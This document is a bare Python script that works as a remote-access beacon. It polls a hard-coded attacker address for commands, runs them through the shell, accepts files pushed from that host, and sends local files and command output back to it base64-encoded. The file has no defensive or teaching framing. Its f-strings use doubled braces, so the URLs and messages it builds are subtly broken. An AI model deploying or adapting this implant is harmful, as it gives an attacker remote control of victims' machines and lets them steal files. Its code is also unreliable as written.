import requests
import subprocess
import time
import base64
import os

ATTACKER_URL = "http://192.168.149.172"
BEACON_INTERVAL = 20

def execute(cmd):
    # Receive file from attacker
    if cmd.startswith("receive "):
        _, remote_path, data = cmd.split(maxsplit=2)
        with open(remote_path, "wb") as f:
            f.write(base64.b64decode(data))
        return f"Received {{remote_path}} ({{len(data)//4*3}} bytes)"

    # Send file to attacker
    elif cmd.startswith("sendfile "):
        remote_path = cmd.split(maxsplit=1)[1]
        if os.path.exists(remote_path):
            with open(remote_path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode()
            filename = os.path.basename(remote_path)
            return f"FILE:{{file_data}}FILENAME:{{filename}}"
        return "File not found"
    else:
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60).decode()
        except Exception as e:
            return f"Error: {{str(e)}}"

while True:
    try:
        cmd = requests.get(f"{{ATTACKER_URL}}/poll").text
        if cmd == "wait":
            time.sleep(BEACON_INTERVAL)
            continue

        output = execute(cmd.strip())
        requests.post(
            f"{{ATTACKER_URL}}/submit",
            data=base64.b64encode(output.encode())
        )

    except Exception:
        time.sleep(BEACON_INTERVAL)
